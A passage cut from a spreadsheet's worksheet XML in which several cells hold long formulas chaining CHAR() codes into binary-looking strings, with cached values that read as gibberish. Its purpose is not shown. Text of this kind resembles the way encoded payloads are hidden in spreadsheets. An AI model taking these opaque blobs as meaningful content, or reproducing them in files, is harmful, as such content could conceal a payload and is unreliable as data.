R(147)&amp;CHAR(12)&amp;CHAR(16)&amp;CHAR(112)&amp;CHAR(135)&amp;CHAR(75)&amp;CHAR(39)&amp;CHAR(207)&amp;CHAR(255)&amp;CHAR(172)&amp;CHAR(171)&amp;CHAR(140)&amp;CHAR(95)&amp;CHAR(129)&amp;CHAR(61)&amp;CHAR(89)&amp;CHAR(6)&amp;CHAR(200)&amp;CHAR(219)&amp;CHAR(45)&amp;CHAR(253)&amp;CHAR(150)&amp;CHAR(139)&amp;CHAR(184)&amp;CHAR(41)&amp;CHAR(236)&amp;CHAR(128)&amp;CHAR(89)&amp;CHAR(101)&amp;CHAR(207)&amp;CHAR(201)&amp;CHAR(187)&amp;CHAR(252)&amp;CHAR(6)&amp;CHAR(183)&amp;CHAR(41)&amp;CHAR(43)&amp;CHAR(146)&amp;CHAR(221)&amp;CHAR(65)&amp;CHAR(201)&amp;CHAR(35)&amp;CHAR(52)&amp;CHAR(89)&amp;CHAR(24)&amp;CHAR(182)&amp;CHAR(223)&amp;CHAR(114)&amp;CHAR(214)&amp;CHAR(185)&amp;CHAR(23)&amp;CHAR(159)&amp;CHAR(123)&amp;CHAR(198)&amp;CHAR(101)&amp;CHAR(17)&amp;CHAR(60)&amp;CHAR(229)&amp;CHAR(248)&amp;CHAR(106)&amp;CHAR(15)&amp;CHAR(220)&amp;CHAR(20)&amp;CHAR(238)&amp;CHAR(24)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(54)&amp;CHAR(206)&amp;CHAR(243)&amp;CHAR(82)&amp;CHAR(248)&amp;CHAR(66)&amp;CHAR(72)&amp;CHAR(37)&amp;CHAR(68)&amp;CHAR(218)&amp;CHAR(104)&amp;CHAR(255)&amp;CHAR(25)&amp;CHAR(163)&amp;CHAR(207)&amp;CHAR(239)&amp;CHAR(122)&amp;CHAR(39)&amp;CHAR(96)&amp;CHAR(141)&amp;CHAR(29)&amp;CHAR(169)&amp;CHAR(203)&amp;CHAR(202)&amp;CHAR(197)&amp;CHAR(121)&amp;CHAR(70)&amp;CHAR(124)&amp;CHAR(44)&amp;CHAR(217)&amp;CHAR(64)&amp;CHAR(64)&amp;CHAR(59)&amp;CHAR(214)&amp;CHAR(28)&amp;CHAR(3)&amp;CHAR(187)&amp;CHAR(58)&amp;CHAR(210)&amp;CHAR(91)&amp;CHAR(157)&amp;CHAR(3)&amp;CHAR(97)&amp;CHAR(15)&amp;CHAR(157)&amp;CHAR(92)&amp;CHAR(211)</f>
        <v>L·ï¯…}ôà¼'_x001B_4±P*m_x000B_]ÚÐÏ_x0002_ØEoXLÒDó&amp;¯_x0007_¾ù_x0007_¶!ô¶6•ÌôÃ_x001D_É!%Ä]¨OÉÔ «ÞZ–öCÑƒRÀehd^_x0004_7©¹W×Jµ_x0018__x0018_H_x0015_&gt;næZØ„Òg_x0003_…_x0006_Õ3;_x001E__x001E_Ú_x000F_…_x0004_6z#.š{©‰gõÑ`_x0014__x0019_¯Â¸1±Ò{‚_x001C_(™Éë_x0008_æB_x000C_’B'“_x000C__x0010_p‡K'Ïÿ¬«Œ_=Y_x0006_ÈÛ-ý–‹¸)ì€YeÏÉ»ü_x0006_·)+’ÝAÉ#4Y_x0018_¶ßrÖ¹_x0017_Ÿ{Æe_x0011_&lt;åøj_x000F_Ü_x0014_î_x0018_Ë&gt;6ÎóRøBH%DÚhÿ_x0019_£Ïïz'`_x001D_©ËÊÅyF|,Ù@@;Ö_x001C__x0003_»:Ò[_x0003_a_x000F_\Ó</v>
      </c>
      <c r="C85" t="str">
        <f>CHAR(183)&amp;CHAR(55)&amp;CHAR(94)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(165)</f>
        <v>·7^È!¥ž‡µ¥</v>
      </c>
    </row>
    <row r="86" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B86" t="str">
        <f>CHAR(112)&amp;CHAR(226)&amp;CHAR(160)&amp;CHAR(235)&amp;CHAR(30)&amp;CHAR(109)&amp;CHAR(242)&amp;CHAR(152)&amp;CHAR(65)&amp;CHAR(199)&amp;CHAR(140)&amp;CHAR(130)&amp;CHAR(238)&amp;CHAR(235)&amp;CHAR(132)&amp;CHAR(125)&amp;CHAR(67)&amp;CHAR(191)&amp;CHAR(183)&amp;CHAR(243)&amp;CHAR(3)&amp;CHAR(155)&amp;CHAR(157)&amp;CHAR(121)&amp;CHAR(227)&amp;CHAR(239)&amp;CHAR(140)&amp;CHAR(133)&amp;CHAR(126)&amp;CHAR(121)&amp;CHAR(150)&amp;CHAR(150)&amp;CHAR(204)&amp;CHAR(132)&amp;CHAR(49)&amp;CHAR(182)&amp;CHAR(37)&amp;CHAR(223)&amp;CHAR(53)&amp;CHAR(66)&amp;CHAR(58)&amp;CHAR(44)&amp;CHAR(185)&amp;CHAR(142)&amp;CHAR(56)&amp;CHAR(240)&amp;CHAR(207)&amp;CHAR(108)&amp;CHAR(164)&amp;CHAR(58)&amp;CHAR(16)&amp;CHAR(191)&amp;CHAR(50)&amp;CHAR(221)&amp;CHAR(252)&amp;CHAR(60)&amp;CHAR(129)&amp;CHAR(218)&amp;CHAR(138)&amp;CHAR(21)&amp;CHAR(6)&amp;CHAR(100)&amp;CHAR(196)&amp;CHAR(174)&amp;CHAR(252)&amp;CHAR(39)&amp;CHAR(198)&amp;CHAR(138)&amp;CHAR(248)&amp;CHAR(40)&amp;CHAR(208)&amp;CHAR(140)&amp;CHAR(10)&amp;CHAR(87)&amp;CHAR(159)&amp;CHAR(135)&amp;CHAR(132)&amp;CHAR(255)&amp;CHAR(253)&amp;CHAR(49)&amp;CHAR(117)&amp;CHAR(240)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(235)&amp;CHAR(2)&amp;CHAR(88)&amp;CHAR(28)&amp;CHAR(250)&amp;CHAR(244)&amp;CHAR(135)&amp;CHAR(159)&amp;CHAR(243)&amp;CHAR(210)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(241)&amp;CHAR(71)&amp;CHAR(177)&amp;CHAR(208)&amp;CHAR(72)&amp;CHAR(120)&amp;CHAR(78)&amp;CHAR(172)&amp;CHAR(35)&amp;CHAR(124)&amp;CHAR(17)&amp;CHAR(44)&amp;CHAR(33)&amp;CHAR(34)&amp;CHAR(69)&amp;CHAR(154)&amp;CHAR(187)&amp;CHAR(53)&amp;CHAR(169)&amp;CHAR(155)&amp;CHAR(228)&amp;CHAR(150)&amp;CHAR(93)&amp;CHAR(42)&amp;CHAR(166)&amp;CHAR(251)&amp;CHAR(58)&amp;CHAR(29)&amp;CHAR(116)&amp;CHAR(15)&amp;CHAR(210)&amp;CHAR(198)&amp;CHAR(5)&amp;CHAR(95)&amp;CHAR(34)&amp;CHAR(138)&amp;CHAR(149)&amp;CHAR(160)&amp;CHAR(235)&amp;CHAR(233)&amp;CHAR(72)&amp;CHAR(169)&amp;CHAR(37)&amp;CHAR(35)&amp;CHAR(30)&amp;CHAR(125)&amp;CHAR(193)&amp;CHAR(255)&amp;CHAR(166)&amp;CHAR(231)&amp;CHAR(245)&amp;CHAR(35)&amp;CHAR(20)&amp;CHAR(122)&amp;CHAR(38)&amp;CHAR(211)&amp;CHAR(178)&amp;CHAR(149)&amp;CHAR(224)&amp;CHAR(155)&amp;CHAR(191)&amp;CHAR(173)&amp;CHAR(49)&amp;CHAR(242)&amp;CHAR(54)&amp;CHAR(19)&amp;CHAR(207)&amp;CHAR(135)&amp;CHAR(151)&amp;CHAR(104)&amp;CHAR(54)&amp;CHAR(8)&amp;CHAR(29)&amp;CHAR(95)&amp;CHAR(84)&amp;CHAR(90)&amp;CHAR(191)&amp;CHAR(81)&amp;CHAR(48)&amp;CHAR(128)&amp;CHAR(93)&amp;CHAR(187)&amp;CHAR(60)&amp;CHAR(145)&amp;CHAR(130)&amp;CHAR(127)&amp;CHAR(121)&amp;CHAR(184)&amp;CHAR(62)&amp;CHAR(94)&amp;CHAR(190)&amp;CHAR(45)&amp;CHAR(217)&amp;CHAR(36)&amp;CHAR(210)&amp;CHAR(134)&amp;CHAR(228)&amp;CHAR(92)&amp;CHAR(210)&amp;CHAR(75)&amp;CHAR(180)&amp;CHAR(159)&amp;CHAR(56)&amp;CHAR(253)&amp;CHAR(85)&amp;CHAR(92)&amp;CHAR(122)&amp;CHAR(116)&amp;CHAR(176)&amp;CHAR(131)&amp;CHAR(7)&amp;CHAR(71)&amp;CHAR(157)&amp;CHAR(32)&amp;CHAR(35)&amp;CHAR(152)&amp;CHAR(150)&amp;CHAR(101)&amp;CHAR(240)&amp;CHAR(191)&amp;CHAR(204)&amp;CHAR(2)&amp;CHAR(39)&amp;CHAR(117)&amp;CHAR(248)&amp;CHAR(10)&amp;CHAR(8)&amp;CHAR(169)&amp;CHAR(80)&amp;CHAR(67)&amp;CHAR(16)&amp;CHAR(182)&amp;CHAR(138)&amp;CHAR(112)&amp;CHAR(3)&amp;CHAR(217)&amp;CHAR(20)&amp;CHAR(245)&amp;CHAR(40)&amp;CHAR(238)&amp;CHAR(52)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(13)&amp;CHAR(239)&amp;CHAR(50)&amp;CHAR(64)&amp;CHAR(127)&amp;CHAR(249)&amp;CHAR(109)&amp;CHAR(107)&amp;CHAR(135)&amp;CHAR(17)&amp;CHAR(216)&amp;CHAR(251)&amp;CHAR(72)&amp;CHAR(10)&amp;CHAR(127)&amp;CHAR(12)</f>
        <v>pâ ë_x001E_mò˜AÇŒ‚îë„}C¿·ó_x0003_›yãïŒ…~y––Ì„1¶%ß5B:,¹Ž8ðÏl¤:_x0010_¿2Ýü&lt;ÚŠ_x0015__x0006_dÄ®ü'ÆŠø(ÐŒ
WŸ‡„ÿý1uð_x0007__x0005_ë_x0002_X_x001C_úô‡ŸóÒ_x0001__x001D_ñG±ÐHxN¬#|_x0011_,!"Eš»5©›ä–]*¦û:_x001D_t_x000F_ÒÆ_x0005__"Š• ëéH©%#_x001E_}Áÿ¦çõ#_x0014_z&amp;Ó²•à›¿­1ò6_x0013_Ï‡—h6_x0008__x001D__TZ¿Q0€]»&lt;‘‚y¸&gt;^¾-Ù$Ò†ä\ÒK´Ÿ8ýU\zt°ƒ_x0007_G #˜–eð¿Ì_x0002_'uø
_x0008_©PC_x0010_¶Šp_x0003_Ù_x0014_õ(î4žC_x000D_ï2@ùmk‡_x0011_ØûH
_x000C_</v>
      </c>
      <c r="C86" t="str">
        <f>CHAR(243)&amp;CHAR(224)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(135)&amp;CHAR(191)&amp;CHAR(115)&amp;CHAR(86)&amp;CHAR(200)</f>
        <v>óà!¥û‡¿sVÈ</v>
      </c>
    </row>
    <row r="87" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B87" t="str">
        <f>CHAR(151)&amp;CHAR(198)&amp;CHAR(123)&amp;CHAR(94)&amp;CHAR(84)&amp;CHAR(45)&amp;CHAR(52)&amp;CHAR(16)&amp;CHAR(134)&amp;CHAR(65)&amp;CHAR(198)&amp;CHAR(79)&amp;CHAR(116)&amp;CHAR(157)&amp;CHAR(225)&amp;CHAR(128)&amp;CHAR(171)&amp;CHAR(181)&amp;CHAR(253)&amp;CHAR(235)&amp;CHAR(255)&amp;CHAR(208)&amp;CHAR(168)&amp;CHAR(112)&amp;CHAR(164)&amp;CHAR(218)&amp;CHAR(239)&amp;CHAR(161)&amp;CHAR(221)&amp;CHAR(15)&amp;CHAR(73)&amp;CHAR(175)&amp;CHAR(254)&amp;CHAR(104)&amp;CHAR(235)&amp;CHAR(127)&amp;CHAR(169)&amp;CHAR(215)&amp;CHAR(238)&amp;CHAR(18)&amp;CHAR(244)&amp;CHAR(197)&amp;CHAR(138)&amp;CHAR(220)&amp;CHAR(149)&amp;CHAR(10)&amp;CHAR(149)&amp;CHAR(144)&amp;CHAR(28)&amp;CHAR(8)&amp;CHAR(199)&amp;CHAR(245)&amp;CHAR(197)&amp;CHAR(110)&amp;CHAR(219)&amp;CHAR(58)&amp;CHAR(106)&amp;CHAR(34)&amp;CHAR(19)&amp;CHAR(64)&amp;CHAR(255)&amp;CHAR(105)&amp;CHAR(251)&amp;CHAR(122)&amp;CHAR(48)&amp;CHAR(98)&amp;CHAR(65)&amp;CHAR(93)&amp;CHAR(32)&amp;CHAR(185)&amp;CHAR(143)&amp;CHAR(240)&amp;CHAR(125)&amp;CHAR(52)&amp;CHAR(251)&amp;CHAR(4)&amp;CHAR(145)&amp;CHAR(218)&amp;CHAR(175)&amp;CHAR(71)&amp;CHAR(4)&amp;CHAR(181)&amp;CHAR(246)&amp;CHAR(12)&amp;CHAR(99)&amp;CHAR(167)&amp;CHAR(82)&amp;CHAR(13)&amp;CHAR(250)&amp;CHAR(227)&amp;CHAR(61)&amp;CHAR(106)&amp;CHAR(204)&amp;CHAR(233)&amp;CHAR(4)&amp;CHAR(36)&amp;CHAR(210)&amp;CHAR(13)&amp;CHAR(228)&amp;CHAR(116)&amp;CHAR(112)&amp;CHAR(165)&amp;CHAR(124)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(121)&amp;CHAR(251)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(173)&amp;CHAR(222)&amp;CHAR(215)&amp;CHAR(217)&amp;CHAR(125)&amp;CHAR(239)&amp;CHAR(11)&amp;CHAR(250)&amp;CHAR(126)&amp;CHAR(110)&amp;CHAR(82)&amp;CHAR(2)&amp;CHAR(232)&amp;CHAR(243)&amp;CHAR(133)&amp;CHAR(44)&amp;CHAR(40)&amp;CHAR(122)&amp;CHAR(53)&amp;CHAR(180)&amp;CHAR(116)&amp;CHAR(206)&amp;CHAR(104)&amp;CHAR(234)&amp;CHAR(208)&amp;CHAR(100)&amp;CHAR(234)&amp;CHAR(248)&amp;CHAR(187)&amp;CHAR(218)&amp;CHAR(6)&amp;CHAR(241)&amp;CHAR(207)&amp;CHAR(186)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(192)&amp;CHAR(8)&amp;CHAR(60)&amp;CHAR(107)&amp;CHAR(92)&amp;CHAR(245)&amp;CHAR(140)&amp;CHAR(132)&amp;CHAR(66)&amp;CHAR(253)&amp;CHAR(187)&amp;CHAR(162)&amp;CHAR(145)&amp;CHAR(209)&amp;CHAR(101)&amp;CHAR(32)&amp;CHAR(34)&amp;CHAR(71)&amp;CHAR(218)&amp;CHAR(47)&amp;CHAR(136)&amp;CHAR(61)&amp;CHAR(66)&amp;CHAR(21)&amp;CHAR(238)&amp;CHAR(2)&amp;CHAR(191)&amp;CHAR(84)&amp;CHAR(251)&amp;CHAR(2)&amp;CHAR(168)&amp;CHAR(176)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(32)&amp;CHAR(26)&amp;CHAR(99)&amp;CHAR(128)&amp;CHAR(189)&amp;CHAR(38)&amp;CHAR(214)&amp;CHAR(70)&amp;CHAR(229)&amp;CHAR(239)&amp;CHAR(234)&amp;CHAR(31)&amp;CHAR(201)&amp;CHAR(235)&amp;CHAR(220)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(172)&amp;CHAR(73)&amp;CHAR(38)&amp;CHAR(181)&amp;CHAR(202)&amp;CHAR(142)&amp;CHAR(51)&amp;CHAR(36)&amp;CHAR(35)&amp;CHAR(207)&amp;CHAR(140)&amp;CHAR(189)&amp;CHAR(116)&amp;CHAR(20)&amp;CHAR(203)&amp;CHAR(92)&amp;CHAR(24)&amp;CHAR(41)&amp;CHAR(155)&amp;CHAR(129)&amp;CHAR(12)&amp;CHAR(93)&amp;CHAR(102)&amp;CHAR(194)&amp;CHAR(47)&amp;CHAR(134)&amp;CHAR(118)&amp;CHAR(65)&amp;CHAR(120)&amp;CHAR(87)&amp;CHAR(200)&amp;CHAR(224)&amp;CHAR(72)&amp;CHAR(150)&amp;CHAR(80)&amp;CHAR(142)&amp;CHAR(113)&amp;CHAR(165)&amp;CHAR(68)&amp;CHAR(245)&amp;CHAR(180)&amp;CHAR(223)&amp;CHAR(119)&amp;CHAR(210)&amp;CHAR(201)&amp;CHAR(53)&amp;CHAR(157)&amp;CHAR(166)&amp;CHAR(178)&amp;CHAR(205)&amp;CHAR(161)&amp;CHAR(160)&amp;CHAR(175)&amp;CHAR(212)&amp;CHAR(49)&amp;CHAR(205)&amp;CHAR(83)&amp;CHAR(206)&amp;CHAR(182)</f>
        <v>—Æ{^T-4_x0010_†AÆOtá€«µýëÿÐ¨p¤Úï¡Ý_x000F_I¯þhë©×î_x0012_ôÅŠÜ•
•_x001C__x0008_ÇõÅnÛ:j"_x0013_@ÿiûz0bA] ¹ð}4û_x0004_‘Ú¯G_x0004_µö_x000C_c§R_x000D_úã=jÌé_x0004_$Ò_x000D_ätp¥|
yû§û­Þ×Ù}ï_x000B_ú~nR_x0002_èó…,(z5´tÎhêÐdêø»Ú_x0006_ñÏº_x000B__x0005_À_x0008_&lt;k\õŒ„Bý»¢‘Ñe "GÚ/ˆ=B_x0015_î_x0002_¿Tû_x0002_¨°Qé _x001A_c€½&amp;ÖFåïê_x001F_ÉëÜ„M¬I&amp;µÊŽ3$#ÏŒ½t_x0014_Ë\_x0018_)›_x000C_]fÂ/†vAxWÈàH–PŽq¥Dõ´ßwÒÉ5¦²Í¡ ¯Ô1ÍSÎ¶</v>
      </c>
      <c r="C87" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(189)&amp;CHAR(243)&amp;CHAR(224)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ž‡µ½óà!¥</v>
      </c>
    </row>
    <row r="88" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B88" t="str">
        <f>CHAR(253)&amp;CHAR(158)&amp;CHAR(142)&amp;CHAR(131)&amp;CHAR(185)&amp;CHAR(50)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(187)&amp;CHAR(238)&amp;CHAR(141)&amp;CHAR(184)&amp;CHAR(105)&amp;CHAR(69)&amp;CHAR(180)&amp;CHAR(252)&amp;CHAR(61)&amp;CHAR(64)&amp;CHAR(82)&amp;CHAR(34)&amp;CHAR(133)&amp;CHAR(178)&amp;CHAR(250)&amp;CHAR(74)&amp;CHAR(8)&amp;CHAR(41)&amp;CHAR(217)&amp;CHAR(180)&amp;CHAR(145)&amp;CHAR(88)&amp;CHAR(218)&amp;CHAR(56)&amp;CHAR(240)&amp;CHAR(31)&amp;CHAR(40)&amp;CHAR(218)&amp;CHAR(77)&amp;CHAR(246)&amp;CHAR(3)&amp;CHAR(151)&amp;CHAR(40)&amp;CHAR(26)&amp;CHAR(197)&amp;CHAR(239)&amp;CHAR(93)&amp;CHAR(125)&amp;CHAR(174)&amp;CHAR(156)&amp;CHAR(135)&amp;CHAR(25)&amp;CHAR(201)&amp;CHAR(104)&amp;CHAR(127)&amp;CHAR(42)&amp;CHAR(79)&amp;CHAR(134)&amp;CHAR(137)&amp;CHAR(103)&amp;CHAR(31)&amp;CHAR(254)&amp;CHAR(138)&amp;CHAR(200)&amp;CHAR(218)&amp;CHAR(228)&amp;CHAR(235)&amp;CHAR(246)&amp;CHAR(126)&amp;CHAR(52)&amp;CHAR(123)&amp;CHAR(72)&amp;CHAR(187)&amp;CHAR(122)&amp;CHAR(162)&amp;CHAR(22)&amp;CHAR(161)&amp;CHAR(40)&amp;CHAR(87)&amp;CHAR(73)&amp;CHAR(246)&amp;CHAR(130)&amp;CHAR(89)&amp;CHAR(207)&amp;CHAR(9)&amp;CHAR(156)&amp;CHAR(8)&amp;CHAR(162)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(237)&amp;CHAR(223)&amp;CHAR(7)&amp;CHAR(54)&amp;CHAR(201)&amp;CHAR(202)&amp;CHAR(17)&amp;CHAR(75)&amp;CHAR(219)&amp;CHAR(190)&amp;CHAR(248)&amp;CHAR(128)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(127)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(133)&amp;CHAR(122)&amp;CHAR(119)&amp;CHAR(249)&amp;CHAR(212)&amp;CHAR(109)&amp;CHAR(186)&amp;CHAR(200)&amp;CHAR(65)&amp;CHAR(206)&amp;CHAR(29)&amp;CHAR(162)&amp;CHAR(204)&amp;CHAR(63)&amp;CHAR(144)&amp;CHAR(116)&amp;CHAR(5)&amp;CHAR(193)&amp;CHAR(49)&amp;CHAR(77)&amp;CHAR(96)&amp;CHAR(59)&amp;CHAR(151)&amp;CHAR(16)&amp;CHAR(140)&amp;CHAR(211)&amp;CHAR(251)&amp;CHAR(185)&amp;CHAR(162)&amp;CHAR(241)&amp;CHAR(152)&amp;CHAR(147)&amp;CHAR(4)&amp;CHAR(70)&amp;CHAR(236)&amp;CHAR(74)&amp;CHAR(53)&amp;CHAR(42)&amp;CHAR(27)&amp;CHAR(65)&amp;CHAR(36)&amp;CHAR(144)&amp;CHAR(51)&amp;CHAR(241)&amp;CHAR(175)&amp;CHAR(196)&amp;CHAR(103)&amp;CHAR(184)&amp;CHAR(222)&amp;CHAR(232)&amp;CHAR(37)&amp;CHAR(73)&amp;CHAR(105)&amp;CHAR(16)&amp;CHAR(246)&amp;CHAR(177)&amp;CHAR(225)&amp;CHAR(69)&amp;CHAR(185)&amp;CHAR(100)&amp;CHAR(119)&amp;CHAR(219)&amp;CHAR(109)&amp;CHAR(72)&amp;CHAR(123)&amp;CHAR(170)&amp;CHAR(163)&amp;CHAR(208)&amp;CHAR(195)&amp;CHAR(78)&amp;CHAR(40)&amp;CHAR(169)&amp;CHAR(175)&amp;CHAR(173)&amp;CHAR(141)&amp;CHAR(55)&amp;CHAR(253)&amp;CHAR(57)&amp;CHAR(176)&amp;CHAR(237)&amp;CHAR(135)&amp;CHAR(214)&amp;CHAR(87)&amp;CHAR(225)&amp;CHAR(39)&amp;CHAR(53)&amp;CHAR(132)&amp;CHAR(196)&amp;CHAR(38)&amp;CHAR(214)&amp;CHAR(103)&amp;CHAR(94)&amp;CHAR(10)&amp;CHAR(212)&amp;CHAR(75)&amp;CHAR(232)&amp;CHAR(43)&amp;CHAR(83)&amp;CHAR(92)&amp;CHAR(219)&amp;CHAR(228)&amp;CHAR(240)&amp;CHAR(10)&amp;CHAR(157)&amp;CHAR(179)&amp;CHAR(36)&amp;CHAR(200)&amp;CHAR(207)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(44)&amp;CHAR(191)&amp;CHAR(123)&amp;CHAR(245)&amp;CHAR(39)&amp;CHAR(36)&amp;CHAR(11)&amp;CHAR(88)&amp;CHAR(69)&amp;CHAR(140)&amp;CHAR(82)&amp;CHAR(64)&amp;CHAR(51)&amp;CHAR(255)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(79)&amp;CHAR(102)&amp;CHAR(118)&amp;CHAR(242)&amp;CHAR(164)&amp;CHAR(154)&amp;CHAR(129)&amp;CHAR(40)&amp;CHAR(56)&amp;CHAR(219)&amp;CHAR(205)&amp;CHAR(141)&amp;CHAR(141)&amp;CHAR(191)&amp;CHAR(209)&amp;CHAR(50)&amp;CHAR(207)&amp;CHAR(6)&amp;CHAR(124)&amp;CHAR(180)&amp;CHAR(175)&amp;CHAR(238)&amp;CHAR(127)&amp;CHAR(157)</f>
        <v>ýžŽƒ¹2ôT»î¸iE´ü=@R"…²úJ_x0008_)Ù´‘XÚ8ð_x001F_(ÚMö_x0003_—(_x001A_Åï]}®œ‡_x0019_Éh*O†‰g_x001F_þŠÈÚäëö~4{H»z¢_x0016_¡(WIö‚YÏ	œ_x0008_¢ípíß_x0007_6ÉÊ_x0011_KÛ¾ø€_x000B__x0006_Ë&gt;…zwùÔmºÈAÎ_x001D_¢Ì?t_x0005_Á1M`;—_x0010_ŒÓû¹¢ñ˜“_x0004_FìJ5*_x001B_A$3ñ¯Äg¸Þè%Ii_x0010_ö±áE¹dwÛmH{ª£ÐÃN(©¯­7ý9°í‡ÖWá'5„Ä&amp;Ög^
ÔKè+S\Ûäð
³$ÈÏJ_x0002_,¿{õ'$_x000B_XEŒR@3ÿ‰_x0003_Ofvò¤š(8ÛÍ¿Ñ2Ï_x0006_|´¯î</v>
      </c>
      <c r="C88" t="str">
        <f>CHAR(251)&amp;CHAR(135)&amp;CHAR(191)&amp;CHAR(112)&amp;CHAR(94)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(68)</f>
        <v>û‡¿p^È!¥³D</v>
      </c>
    </row>
    <row r="89" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B89" t="str">
        <f>CHAR(72)&amp;CHAR(37)&amp;CHAR(208)&amp;CHAR(172)&amp;CHAR(241)&amp;CHAR(4)&amp;CHAR(58)&amp;CHAR(17)&amp;CHAR(75)&amp;CHAR(216)&amp;CHAR(39)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(167)&amp;CHAR(228)&amp;CHAR(168)&amp;CHAR(173)&amp;CHAR(137)&amp;CHAR(71)&amp;CHAR(224)&amp;CHAR(227)&amp;CHAR(185)&amp;CHAR(115)&amp;CHAR(153)&amp;CHAR(218)&amp;CHAR(58)&amp;CHAR(137)&amp;CHAR(115)&amp;CHAR(139)&amp;CHAR(200)&amp;CHAR(154)&amp;CHAR(214)&amp;CHAR(157)&amp;CHAR(130)&amp;CHAR(42)&amp;CHAR(169)&amp;CHAR(205)&amp;CHAR(100)&amp;CHAR(202)&amp;CHAR(163)&amp;CHAR(131)&amp;CHAR(1)&amp;CHAR(162)&amp;CHAR(41)&amp;CHAR(20)&amp;CHAR(73)&amp;CHAR(14)&amp;CHAR(28)&amp;CHAR(232)&amp;CHAR(170)&amp;CHAR(190)&amp;CHAR(16)&amp;CHAR(168)&amp;CHAR(44)&amp;CHAR(113)&amp;CHAR(61)&amp;CHAR(204)&amp;CHAR(57)&amp;CHAR(182)&amp;CHAR(185)&amp;CHAR(120)&amp;CHAR(90)&amp;CHAR(207)&amp;CHAR(3)&amp;CHAR(188)&amp;CHAR(153)&amp;CHAR(197)&amp;CHAR(131)&amp;CHAR(248)&amp;CHAR(168)&amp;CHAR(181)&amp;CHAR(29)&amp;CHAR(226)&amp;CHAR(164)&amp;CHAR(150)&amp;CHAR(254)&amp;CHAR(114)&amp;CHAR(234)&amp;CHAR(150)&amp;CHAR(2)&amp;CHAR(167)&amp;CHAR(20)&amp;CHAR(249)&amp;CHAR(52)&amp;CHAR(52)&amp;CHAR(52)&amp;CHAR(98)&amp;CHAR(174)&amp;CHAR(98)&amp;CHAR(171)&amp;CHAR(69)&amp;CHAR(26)&amp;CHAR(38)&amp;CHAR(226)&amp;CHAR(69)&amp;CHAR(2)&amp;CHAR(252)&amp;CHAR(171)&amp;CHAR(179)&amp;CHAR(200)&amp;CHAR(160)&amp;CHAR(1)&amp;CHAR(206)&amp;CHAR(60)&amp;CHAR(177)&amp;CHAR(188)&amp;CHAR(55)&amp;CHAR(217)&amp;CHAR(78)&amp;CHAR(254)&amp;CHAR(225)&amp;CHAR(241)&amp;CHAR(193)&amp;CHAR(64)&amp;CHAR(10)&amp;CHAR(79)&amp;CHAR(197)&amp;CHAR(93)&amp;CHAR(221)&amp;CHAR(156)&amp;CHAR(137)&amp;CHAR(48)&amp;CHAR(45)&amp;CHAR(220)&amp;CHAR(27)&amp;CHAR(129)&amp;CHAR(111)&amp;CHAR(127)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(73)&amp;CHAR(85)&amp;CHAR(198)&amp;CHAR(122)&amp;CHAR(93)&amp;CHAR(115)&amp;CHAR(74)&amp;CHAR(43)&amp;CHAR(83)&amp;CHAR(254)&amp;CHAR(158)&amp;CHAR(255)&amp;CHAR(92)&amp;CHAR(13)&amp;CHAR(202)&amp;CHAR(12)&amp;CHAR(17)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(136)&amp;CHAR(35)&amp;CHAR(2)&amp;CHAR(49)&amp;CHAR(128)&amp;CHAR(241)&amp;CHAR(5)&amp;CHAR(219)&amp;CHAR(59)&amp;CHAR(10)&amp;CHAR(50)&amp;CHAR(189)&amp;CHAR(173)&amp;CHAR(132)&amp;CHAR(15)&amp;CHAR(102)&amp;CHAR(90)&amp;CHAR(234)&amp;CHAR(155)&amp;CHAR(164)&amp;CHAR(47)&amp;CHAR(219)&amp;CHAR(217)&amp;CHAR(109)&amp;CHAR(106)&amp;CHAR(183)&amp;CHAR(229)&amp;CHAR(83)&amp;CHAR(76)&amp;CHAR(92)&amp;CHAR(147)&amp;CHAR(177)&amp;CHAR(200)&amp;CHAR(204)&amp;CHAR(120)&amp;CHAR(210)&amp;CHAR(136)&amp;CHAR(165)&amp;CHAR(172)&amp;CHAR(130)&amp;CHAR(96)&amp;CHAR(139)&amp;CHAR(25)&amp;CHAR(245)&amp;CHAR(251)&amp;CHAR(66)&amp;CHAR(208)&amp;CHAR(215)&amp;CHAR(19)&amp;CHAR(166)&amp;CHAR(222)&amp;CHAR(22)&amp;CHAR(27)&amp;CHAR(212)&amp;CHAR(253)&amp;CHAR(195)&amp;CHAR(86)&amp;CHAR(147)&amp;CHAR(64)&amp;CHAR(48)&amp;CHAR(53)&amp;CHAR(66)&amp;CHAR(21)&amp;CHAR(193)&amp;CHAR(73)&amp;CHAR(145)&amp;CHAR(235)&amp;CHAR(105)&amp;CHAR(8)&amp;CHAR(160)&amp;CHAR(211)&amp;CHAR(7)&amp;CHAR(53)&amp;CHAR(141)&amp;CHAR(131)&amp;CHAR(206)&amp;CHAR(238)&amp;CHAR(139)&amp;CHAR(151)&amp;CHAR(116)&amp;CHAR(218)&amp;CHAR(148)&amp;CHAR(29)&amp;CHAR(248)&amp;CHAR(